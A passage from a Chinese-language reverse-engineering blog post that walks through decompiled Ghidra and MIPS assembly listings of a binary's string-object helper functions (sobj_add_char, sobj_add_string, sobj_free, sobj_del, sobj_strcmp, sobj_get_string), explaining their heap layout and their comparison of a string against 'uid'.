      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> iVar2 <span class="token operator">+</span> <span class="token number">0x20</span><span class="token punctuation">;</span>
      pvVar1 <span class="token operator">=</span> <span class="token function">realloc</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">,</span>iVar2 <span class="token operator">+</span> <span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//最后一个为空字节NULL</span>
      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">=</span> pvVar1<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//还要判断上面realloc的返回地址是否为0</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>该函数的作用就是在sobj_new()申请的结构体0x14处malloc/remalloc一个0x21的堆空间，然后将0xc处内容加上0x20。</p>
<h2 id="sobj-add-char-int-malloc-addr-undefined-c"><a href="#sobj-add-char-int-malloc-addr-undefined-c" class="headerlink" title="sobj_add_char(int malloc_addr,undefined c)"></a>sobj_add_char(int malloc_addr,undefined c)</h2><p>该函数的参数有两个：之前sobj_new()申请的结构体首地址malloc_addr，需要add的字符c</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">sobj_add_char</span><span class="token punctuation">(</span><span class="token keyword">int</span> malloc_addr<span class="token punctuation">,</span>undefined c<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  undefined4 uVar2<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span>
     <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">=</span> <span class="token function">FUN_0040e864</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> iVar1 <span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//申请的字节数等于拷贝的字节数并且申请空间失败则退出</span>
  <span class="token punctuation">{</span>
    uVar2 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    iVar1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//0x10处加一</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> c<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//申请的堆栈空间加上新的字符串c</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> iVar1<span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>malloc_addr<span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">+</span> iVar1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    uVar2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> uVar2<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>可以看下运行完一次sobj_add_char之后的结果:</p>
<p><img src="sobj_add_char()1.png" alt=""></p>
<p>运行玩一次之后0x10处为1,0x14处显示的申请的remalloc/malloc的地址，0xc处显示的0x20。</p>
<p><img src="sobj_add_char()2.png" alt=""></p>
<p>并且0x14处的堆地址空间内添加了第一个字符’u’。</p>
<h2 id="sobj-add-string"><a href="#sobj-add-string" class="headerlink" title="sobj_add_string()"></a>sobj_add_string()</h2><p>该函数的参数有两个：目的字符串地址deststr也是sobj_new()申请的结构体地址，需要add的字符串地址sourcestr</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">sobj_add_string</span><span class="token punctuation">(</span><span class="token keyword">int</span> deststr<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>sourcestr<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  size_t len_of_source<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>
  undefined4 len_of_return<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>deststr <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    len_of_return <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    len_of_return <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>sourcestr <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      len_of_source <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>sourcestr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取的第二个参数的长度</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>len_of_source <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        len_of_return <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">do</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//如果需要拷贝的字符串长度小于0xc（总长度）-0x10（已经拷贝过的长度），直接strcpy即可</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>len_of_source <span class="token operator">&lt;=</span> <span class="token punctuation">(</span>uint<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sourcestr<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>deststr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> len_of_source<span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          iVar1 <span class="token operator">=</span> <span class="token function">FUN_0040e864</span><span class="token punctuation">(</span>deststr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//否则不断申请加0x20直到能够strcpy，每次成功都是返回ivar = 0</span>
          len_of_return <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&lt;</span> iVar1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//如果上面的FUN_0040e864(deststr)出错ivar=-1</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> len_of_return<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>所以通过继续分析sobj_add_string/sobj_add_char函数得知，其sobj_new返回的结构体中0x10存放<strong>当前使用的字节数即进行拷贝过的字节数</strong>，0xc处存放<strong>当前申请的总长度减去1字节(代表空字节)</strong>，0x14存放<strong>malloc/realloc返回的地址也就是申请存放字符串的堆栈空间</strong>，而且每次会将需求拷贝字符串的长度与总长度减去已用长度得到可用长度进行比较决定是否需要再次申请空间，而strcpy的deststr为malloc/remalloc分配的地址加上已用字节数得到。   </p>
<h2 id="sobj-free-int-param-1"><a href="#sobj-free-int-param-1" class="headerlink" title="sobj_free(int param_1)"></a>sobj_free(int param_1)</h2><p>该函数只有一个参数就是sobj_new()的结构体地址</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">sobj_free</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  undefined4 uVar1<span class="token punctuation">;</span>

  uVar1 <span class="token operator">=</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//先看0x14上申请的堆空间是否为空</span>
      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//不为空释放</span>
    <span class="token punctuation">}</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0xc</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    uVar1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> uVar1<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>没什么好说的释放空间并清0 </p>
<h2 id="sobj-del-void-param-1"><a href="#sobj-del-void-param-1" class="headerlink" title="sobj_del(void *param_1)"></a>sobj_del(void *param_1)</h2><p>该函数只有一个参数就是sobj_new()的结构体地址</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sobj_del</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>param_1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Could not recover jumptable at 0x0040e77c. Too many branches */</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Treating indirect jump as call */</span>
    <span class="token function">free</span><span class="token punctuation">(</span>param_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>清空sobj_new()的0x14处的堆，之后再清空自身。   </p>
<h2 id="sobj-strcmp-string-new-amp-DAT-0041a5d8"><a href="#sobj-strcmp-string-new-amp-DAT-0041a5d8" class="headerlink" title="sobj_strcmp(string_new,&amp;DAT_0041a5d8)"></a>sobj_strcmp(string_new,&amp;DAT_0041a5d8)</h2><p>该函数有两个参数：string_new是sobj_new()的结构体地址，&amp;DAT_0041a5d8是’uid’的地址。Ghidra反汇编结果如下：</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">sobj_strcmp</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">)</span>

<span class="token punctuation">{</span>
  undefined4 uVar1<span class="token punctuation">;</span>
  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    iVar2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>iVar2 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      iVar2 <span class="token operator">=</span> <span class="token number">0x419b10</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span>iVar2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>undefined <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    uVar1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>code <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>SUB_00402290<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> uVar1<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token number">0xffffffff</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>反汇编结果不好，直接看下面MIPS汇编代码分析：</p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4B0                                          # sess_get_uid<span class="token operator">+</span>234p
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4B0                                          # DATA XREF<span class="token punctuation">:</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4B0                 lui     $gp<span class="token punctuation">,</span> <span class="token number">0x43</span>  # <span class="token string">'C'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4B4                 bnez    $a0<span class="token punctuation">,</span> loc_40E4C4 <span class="token comment" spellcheck="true">//第一个参数也就是string_new不为0则跳转</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4B8                 li      $gp<span class="token punctuation">,</span> <span class="token number">0x4346D0</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4BC                 jr      $ra
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C0                 li      $v0<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C4  # <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C4
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C4 loc_40E4C4<span class="token punctuation">:</span>                              # CODE XREF<span class="token punctuation">:</span> sobj_strcmp<span class="token operator">+</span>4j
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C4                 lw      $a0<span class="token punctuation">,</span> <span class="token function">0x14</span><span class="token punctuation">(</span>$a0<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//获取string_ new0x14处的内容也就是字符串的内容</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4C8                 nop
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4CC                 bnez    $a0<span class="token punctuation">,</span> loc_40E4D8<span class="token comment" spellcheck="true">//0x14处不为0则跳转loc_40E4D8</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4D0                 lui     $v0<span class="token punctuation">,</span> <span class="token number">0x42</span>  # <span class="token string">'B'</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4D4                 addiu   $a0<span class="token punctuation">,</span> $v0<span class="token punctuation">,</span> <span class="token punctuation">(</span>aHttp1_1301Move<span class="token operator">+</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x420000</span><span class="token punctuation">)</span>  # s1
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4D8
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4D8 loc_40E4D8<span class="token punctuation">:</span>                              # CODE XREF<span class="token punctuation">:</span> sobj_strcmp<span class="token operator">+</span>1Cj
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4D8                 la      $t9<span class="token punctuation">,</span> strcmp <span class="token comment" spellcheck="true">//进入strcmp进行比较</span>
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4DC                 nop
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4E0                 jr      $t9 <span class="token punctuation">;</span> strcmp
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E4E4                 nop</code></pre>
<p>该函数的作用比较string_new的0x14处的字符串是否=’uid’。   </p>
<h2 id="sobj-get-string-int-param-1"><a href="#sobj-get-string-int-param-1" class="headerlink" title="sobj_get_string(int param_1)"></a>sobj_get_string(int param_1)</h2><p>该函数的参数只有一个是sobj_new()申请结构体的地址   </p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sobj_get_string</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>

  iVar1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>param_1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>iVar1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    iVar1 <span class="token operator">=</span> <span class="token number">0x419b10</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> iVar1<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>汇编代码：</p>
<pre class=" language-c"><code class="language-c"><span class="token punctuation">.</span>globl sobj_get_string
<span class="token punctuation">.</span>text<span class="token punctuation">:</span>0040E1CC sobj_get_string<span class="token punctuation">:</span>                         # CODE XREF<span class="token punctuation">:</span> sub_403794<span class="token operator">+</span>8Cp
